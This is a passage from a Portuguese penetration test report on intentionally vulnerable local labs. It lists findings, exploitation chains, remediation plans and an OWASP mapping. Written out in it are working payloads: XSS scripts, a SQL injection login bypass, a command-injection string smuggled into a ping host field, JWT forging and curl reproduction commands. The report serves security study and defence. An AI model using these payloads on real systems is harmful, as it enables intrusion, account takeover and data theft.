  Evidência: `root:x:0:0:root:/root:/bin/bash`; também é possível ler `/debug_db` via SSRF interno. Arquivo: `labs/artifacts/attack/ssrf-lfi.txt`.
- **Impacto:** leitura de arquivos do servidor e acesso a serviços internos (contorno de segmentação).
- **Remediação:** allowlist de hosts/esquemas (`https`), bloqueio de IPs privados/loopback/link-local, revalidação do IP resolvido (anti-rebinding).

### F-18 — XSS refletido na busca (dv-bookshop)

- **CVSS 3.1:** 6,1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` · **CWE-79** · `GET /books?search=`.
- **Reprodução:** `search=<script>alert(document.domain)</script>` é refletido sem escape (arquivo `labs/artifacts/attack/xss.txt`).
- **Impacto:** execução de JavaScript na origem da vítima; roubo de sessão e ações em nome do usuário.
- **Remediação:** escape contextual; revisar `|safe`; CSP com nonce; `HttpOnly`/`SameSite`.

### F-19 — IDOR em `/profile?user_id=`

- **CVSS 3.1:** 6,5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` · **CWE-639** · dv-bookshop.
- **Reprodução:** autenticado como `alice_hacker`, `GET /profile?user_id=1` retorna e-mail e cartão do admin (arquivo `labs/artifacts/attack/idor-profile.txt`).
- **Impacto:** exposição de PII e dados de pagamento entre clientes.
- **Remediação:** ignorar `user_id` do cliente e usar o ID da sessão; ou exigir admin.

### F-20 — IDOR em recibos `/download_receipt/<id>`

- **CVSS 3.1:** 6,5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` · **CWE-639** · dv-bookshop.
- **Reprodução:** `bob_secure` cria o pedido `#1`; `alice_hacker` acessa `GET /download_receipt/1` e recebe o recibo com endereço e itens (arquivo `labs/artifacts/attack/idor-receipt.txt`).
- **Remediação:** filtrar por `user_id` na consulta.

### F-21 — Manipulação de preço no checkout

- **CVSS 3.1:** 6,5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` · **CWE-472** · `POST /checkout`.
- **Descrição:** o campo `total` é aceito do cliente. Livro de US$ 45,90 comprado por **US$ 0,01** (pedido `#1`, `total=0.01` no banco).
- **Impacto:** perda financeira e fraude de pedidos.
- **Remediação:** calcular o total no servidor a partir do carrinho/preços; validar quantidade; transação com verificação de saldo.

### F-22 — Ausência de rate limit/lockout no login (dv-bookshop)

- **CVSS 3.1:** 5,3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` · **CWE-307**.
- **Evidência:** sete falhas consecutivas para `admin` não bloquearam a conta (`Incorrect password` em todas); `E2_rate_limit=False` no modo inseguro.
- **Remediação:** lockout progressivo por conta/IP, CAPTCHA, MFA para admin, telemetria de falhas.

### F-23 — XSS refletido em `/search?q=` (vulnshop)

- **CVSS 3.1:** 6,1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` · **CWE-79**.
- **Reprodução:** `q=<script>alert('XSS')</script>` refletido (arquivo `labs/artifacts/attack/vs-xss.txt`).
- **Remediação:** escape de saída e CSP.

### F-24 — CSRF em `/profile` (vulnshop)

- **CVSS 3.1:** 6,5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` · **CWE-352**.
- **Reprodução:** `POST /profile` sem token altera e-mail/senha; observado `hacked@evil.com` após a requisição.
- **Impacto:** account takeover via página maliciosa.
- **Remediação:** token CSRF por sessão, `SameSite=Lax/Strict`, validação de `Origin/Referer`.

### F-25 — Ausência de lockout e senhas fracas (vulnshop)

- **CVSS 3.1:** 5,3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` · **CWE-307/CWE-521**.
- **Evidência:** sete falhas sem bloqueio; senhas `admin123`, `pass123` e `bob456` em texto plano.
- **Remediação:** Argon2id/bcrypt, política de senha, lockout progressivo, MFA.

### F-26 — 500 com stack trace e caminhos internos (Juice Shop)

- **CVSS 3.1:** 5,3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` · **CWE-209** · `POST /b2b/v2/orders`.
- **Reprodução:** JSON malformado (`orderLinesData:"{invalid}"`) gera `500` com stack.
- **Evidência:** `/juice-shop/build/server.js:357`, `/juice-shop/node_modules/express/lib/router/index.js:280` (arquivo `labs/artifacts/attack/js-stacktrace.txt`).
- **Remediação:** handler de erro genérico; `NODE_ENV=production`; logging interno.

### F-27 — CORS permissivo (Juice Shop)

- **CVSS 3.1:** 5,3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` · **CWE-942**.
- **Evidência:** `Access-Control-Allow-Origin: *` em `/rest/user/whoami` mesmo com `Origin: https://evil.example`; 5 instâncias no ZAP.
- **Remediação:** allowlist de origens, `Vary: Origin`, sem `*` em rotas autenticadas.

### F-28 — CSP ausente e headers de isolamento incompletos (Juice Shop)

- **CVSS 3.1:** 5,4 — `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` · **CWE-693**.
- **Evidência:** ZAP baseline 0 FAIL / 7 WARN / 61 PASS; 9 alertas / 39 instâncias; ausência de `Content-Security-Policy`, COEP e COOP; `Feature-Policy` obsoleto.
- **Remediação:** CSP com nonce/hash, COEP/COOP, `Permissions-Policy`.

### F-29 — `/security-events` expõe logs sem autenticação (websec-sqli)

- **CVSS 3.1:** 5,3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` · **CWE-532**.
- **Evidência:** JSON público com payloads, rotas e horários das tentativas.
- **Remediação:** exigir autenticação/autorização no endpoint de auditoria, mascarar dados e limitar retenção.

---

## 8. Achados baixos e informativos

| ID | Achado | Ativo | CVSS | Detalhe | Remediação |
|---|---|---|---|---|---|
| F-30 | Open redirect | dv-bookshop | 4,3 (`AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`, CWE-601) | `/redirect?url=https://evil.example/pwn` → `Location: https://evil.example/pwn`; também via `next` no login | Allowlist ou apenas caminhos relativos |
| F-31 | Hash MD5 não salgado no JWT | Juice Shop | 4,3 (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`, CWE-522/916) | Payload contém `"password":"0192023a7bbd73250516f069df18b500"` = `md5("admin123")` | Não incluir hash no token; Argon2id com salt; claims mínimos |
| F-32 | Listagem de diretório `/uploads` | dv-bookshop | — (CWE-548) | `GET /uploads` lista arquivos enviados, sem auth | Desabilitar listing; autorização por arquivo |
| F-33 | `robots.txt` revela rotas | dv-bookshop | — (CWE-200) | Expõe `/admin`, `/debug_db`, `/api/`, `/admin/ping`, `/admin/preview_url`, `/.git/` | Não listar rotas privadas; proteger por autenticação |
| F-34 | 401 não documentado | Juice Shop | — (CWE-1059) | `POST /b2b/v2/orders` sem auth → 401 fora do contrato (Schemathesis `ST103`) | Documentar 401/403 e security scheme na OpenAPI |

---

## 9. Cadeias de exploração

### Cadeia A — De visitante a RCE (dv-bookshop)

1. `POST /login` com `admin' OR 1=1 /*!50000` → sessão de admin (F-02).
2. `POST /admin/ping` com `127.0.0.1; id; uname -a` → execução de comandos (F-01).
3. Com RCE: leitura de `users.db`/`bookshop.db`, `app.secret_key` e `JWT_SECRET`.
4. Persistência via criação de usuário admin ou alteração de configuração.

**Resultado observado:** `uid=1001(daniel)` e banner do kernel.

### Cadeia B — Account takeover sem e-mail (dv-bookshop)

1. `POST /forgot_password` para `admin` → token exibido na resposta.
2. `POST /reset_password/<token>` → nova senha.
3. Login como admin (F-03).

**Alternativa:** calcular `md5("admin"+"khitminnyo2025")` sem interagir com a vítima.

### Cadeia C — Token forjado → segredo do admin (dv-bookshop)

1. Gerar `alg=none` ou HS256 com segredo `secret`.
2. Definir `role=admin` e chamar `/api/jwt/admin` (F-04).
3. Obter a flag/segredo do admin.

### Cadeia D — Credenciais em cascata (vulnshop)

1. `GET /products?id=... UNION SELECT` → usuário/senha (F-13).
2. `POST /login` com bypass (F-05) ou credenciais dumpadas.
3. `GET /admin` sem checagem de papel → credenciais administrativas (F-14).
4. Alteração de dados via `/profile` sem CSRF (F-24).

---

## 10. Plano de remediação

### P0 — Imediato (até 48 h)

| Achado | Ação |
|---|---|
| F-01 | Remover `shell=True`; validar `host`; restringir endpoint |
| F-02, F-05, F-13, F-16 | Prepared statements em todas as consultas; eliminar concatenação |
| F-03 | Token CSPRNG de uso único, somente por e-mail; invalidar sessões |
| F-04 | Fixar algoritmo; rejeitar `none`; segredo ≥256 bits; validar claims |
| F-06 | Desativar credenciais padrão; forçar reset; MFA |
| F-07, F-08 | Remover `/debug_db` e backups do diretório público |
| F-10, F-15 | `debug=False`; servidor de produção; bloquear `/console` |

### P1 — Curto prazo (até 2 semanas)

| Achado | Ação |
|---|---|
| F-09, F-19, F-20 | Autorização por objeto em cartões, perfis e recibos |
| F-11, F-17 | Parametrizar `book_details`; allowlist de URLs e bloqueio de IPs internos |
| F-12, F-25 | Migrar senhas para Argon2id/bcrypt com salt |
| F-14 | Middleware de autorização por papel |
| F-18, F-23 | Escape contextual e CSP |
| F-21 | Total calculado no servidor; validação de quantidade |
| F-24 | Token CSRF, `SameSite`, validação de `Origin` |

### P2 — Médio prazo (até 90 dias)

| Achado | Ação |
|---|---|
| F-22, F-25 | Lockout progressivo, CAPTCHA, MFA e detecção de credential stuffing |
| F-26 | Handler de erro sem stack; `NODE_ENV=production` |
| F-27, F-28 | CORS por allowlist; CSP/COEP/COOP/Permissions-Policy |
| F-29 | Autenticação e retenção no log de segurança |
| F-30, F-31, F-32, F-33, F-34 | Allowlist de redirect; remover hash do JWT; listing; `robots.txt`; contrato OpenAPI |

---

## 11. Evidências anexas

| Arquivo | Achado | Conteúdo |
|---|---|---|
| `labs/artifacts/attack/rce.txt` | F-01 | `uid=1001` + `uname -a` |
| `labs/artifacts/attack/app.py.bak` | F-08 | Código-fonte (83.994 bytes) |
| `labs/artifacts/attack/debug_db.txt` | F-07 | Dump de usuários/senhas/cartões |
| `labs/artifacts/attack/card-idor.json` | F-09 | Cartão do admin sem auth |
| `labs/artifacts/attack/jwt-none.json` | F-04 | Flag via `alg=none` |
| `labs/artifacts/attack/jwt-forged.json` | F-04 | Flag via HS256 |
| `labs/artifacts/attack/reset-token.txt` | F-03 | Token previsível |
| `labs/artifacts/attack/ssrf-lfi.txt` | F-17 | `/etc/passwd` |
| `labs/artifacts/attack/dv-sqli-union.txt` | F-11 | Exfiltração de `admin_logs` |
| `labs/artifacts/attack/idor-profile.txt` | F-19 | PII/cartão do admin |
| `labs/artifacts/attack/idor-receipt.txt` | F-20 | Recibo de outro usuário |
| `labs/artifacts/attack/xss.txt` | F-18 | Payload refletido |
| `labs/artifacts/attack/vs-sqli-union.txt` | F-13 | Credenciais via UNION |
| `labs/artifacts/attack/vs-bac.txt` | F-14 | `/admin` acessível a usuária comum |
| `labs/artifacts/attack/vs-debugger.txt` | F-15 | `SECRET` do Werkzeug |
| `labs/artifacts/attack/vs-xss.txt` | F-23 | XSS refletido |
| `labs/artifacts/attack/ws-sqli.json` | F-16 | Dump de senhas |
| `labs/artifacts/attack/js-stacktrace.txt` | F-26 | Paths internos do Juice Shop |
| `reports/raw/zap-baseline.json` | F-27/F-28 | ZAP: 9 alertas / 39 instâncias |
| `reports/raw/restler-fuzzlean.txt` | F-26 | Buckets 500 do RESTler |
| `reports/raw/spectral.txt` | F-34 | 2 erros de contrato |

> Credenciais, tokens e PANs incluídos são **dados sintéticos de laboratório**, usados como prova de conceito.

---

## 12. Cronologia

| Data/hora | Evento |
|---|---|
| 26/10/2026 | Reconhecimento e revisão de código dos quatro alvos |
| 26/10/2026 | Validação manual de SQLi, XSS, IDOR e falhas de autenticação |
| 26/10/2026 | Exploração de RCE, SSRF/LFI, JWT e reset de senha |
| 26/10/2026 | Fuzzing RESTler/Schemathesis e baseline ZAP |
| 26/10/2026 | Restauração do estado dos laboratórios |
| 26/10/2026 | Emissão deste relatório (v1.0) |

---

## 13. Limitações

- Não houve brute force prolongado, exploração do PIN do console Werkzeug, desserialização ou testes de infraestrutura.
- O CVSS reflete o impacto demonstrado; cadeias que elevam o risco estão anotadas no texto, sem somar pontuações.
- Os alvos são labs; não há comparação com versões de produção dos produtos.
- Nenhuma persistência foi deixada: bancos e configurações foram restaurados após os testes.

---

## 14. Considerações éticas e legais

O teste foi conduzido em aplicações intencionalmente vulneráveis, locais e de propriedade do autor, com o objetivo de estudo, validação de ferramentas e elaboração de modelo de relatório. Não houve acesso a dados de terceiros nem a sistemas sem autorização. As técnicas descritas devem ser usadas exclusivamente em ambientes autorizados e dentro do escopo aprovado.

---

## Anexo A — Mapeamento OWASP Top 10 (2021)

| Categoria | Achados |
|---|---|
| A01 — Broken Access Control | F-09, F-14, F-19, F-20, F-21, F-24 |
| A02 — Cryptographic Failures | F-04, F-12, F-25, F-31 |
| A03 — Injection | F-01, F-02, F-05, F-11, F-13, F-16, F-18, F-23 |
| A04 — Insecure Design | F-21, F-22, F-25 |
| A05 — Security Misconfiguration | F-07, F-08, F-10, F-15, F-26, F-27, F-28, F-32 |
| A06 — Vulnerable and Outdated Components | Não avaliado (fora de escopo) |
| A07 — Identification and Authentication Failures | F-03, F-06, F-25 |
| A08 — Software and Data Integrity Failures | F-04 (verificação de assinatura) |
| A09 — Security Logging and Monitoring Failures | F-29 |
| A10 — SSRF | F-17 |

## Anexo B — Reprodução rápida

```bash
# Subir os laboratórios
cd labs
(cd dv-bookshop && ../.venv/bin/python app.py &)        # 5005
(cd vulnshop   && ../.venv/bin/python app.py &)         # 5000
(cd websec-sqli && PORT=5003 node src/server.js &)      # 5003
# Juice Shop: container já em execução na porta 3000

# F-02 → F-01
curl -c /tmp/a.jar -X POST http://127.0.0.1:5005/login \
     --data-urlencode "username=admin' OR 1=1 /*!50000" --data-urlencode "password=x"
curl -b /tmp/a.jar -X POST http://127.0.0.1:5005/admin/ping \
     --data-urlencode "host=127.0.0.1; id; uname -a"

# F-03
python3 -c "import hashlib;print(hashlib.md5(b'adminkhitminnyo2025').hexdigest())"

# F-06
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
```

## Anexo C — Checklist para submissão individual

Cada achado contém os campos exigidos por plataformas (HackerOne/Bugcrowd). Para submeter separadamente, use:

- [ ] Título objetivo (ex.: "Remote Code Execution via command injection in `/admin/ping`").
- [ ] Ativo e endpoint exatos.
- [ ] Severidade + vetor CVSS 3.1.
- [ ] CWE e categoria OWASP.
- [ ] Pré-condições e conta de teste.
- [ ] Passos numerados com requisição/resposta.
- [ ] Evidência em anexo (texto ou captura).
- [ ] Impacto técnico e de negócio.
- [ ] Remediação sugerida.
- [ ] Referências.
- [ ] Declaração de conformidade com o escopo do programa.

**Ordem sugerida de submissão:** F-01 → F-02 → F-03 → F-04 → F-05 → F-06 → F-07/F-09 → F-11/F-13/F-16 → F-14 → demais.
